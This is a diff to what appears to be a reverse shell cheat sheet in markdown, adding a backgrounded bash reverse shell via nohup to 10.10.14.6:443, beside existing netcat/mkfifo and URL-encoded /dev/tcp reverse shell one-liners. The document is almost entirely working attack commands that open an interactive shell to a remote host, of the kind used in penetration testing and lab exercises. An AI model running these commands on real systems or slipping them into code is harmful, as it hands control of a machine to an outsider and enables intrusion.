@@ -238,6 +238,12 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 {% endcode %}
 
+{% code title="Run in the background" %}
+```sh
+nohup bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" &
+```
+{% endcode %}
+
 {% code title="Use the URL parameter" %}
 ```url
 bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.14/9001+0>%261'
